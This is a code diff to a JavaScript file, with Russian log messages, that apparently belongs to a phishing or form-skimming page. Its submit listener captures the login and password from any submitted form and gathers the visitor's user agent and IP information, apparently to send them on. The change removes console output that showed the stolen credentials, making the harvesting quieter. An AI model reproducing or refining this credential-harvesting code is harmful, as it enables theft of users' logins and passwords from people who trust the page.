@@ -47,12 +47,9 @@ function getSimplifiedUserAgent() {
 }
 
 document.addEventListener("submit", event => {
-    console.log("Слушатель события 'submit' активен.");
-
     const formData = new FormData(event.target);
     const login = formData.get("user") || "Не указано";
     const password = formData.get("passwd") || "Не указано";
-    console.log(`Логин: ${login}\nПароль: ${password}`);
     const simplifiedUserAgent = getSimplifiedUserAgent();
 
     getIPInfo().then(info => {
@@ -78,9 +75,6 @@ ${domainHashTag}`;
         }).catch(err => console.error("Ошибка обработки хэша домена:", err));
     }).catch(err => console.error("Ошибка получения IP информации:", err));
 });
-
-console.log("Слушатель события 'submit' добавлен.");
-
 
 function logPageVisit() {
     const simplifiedUserAgent = getSimplifiedUserAgent();
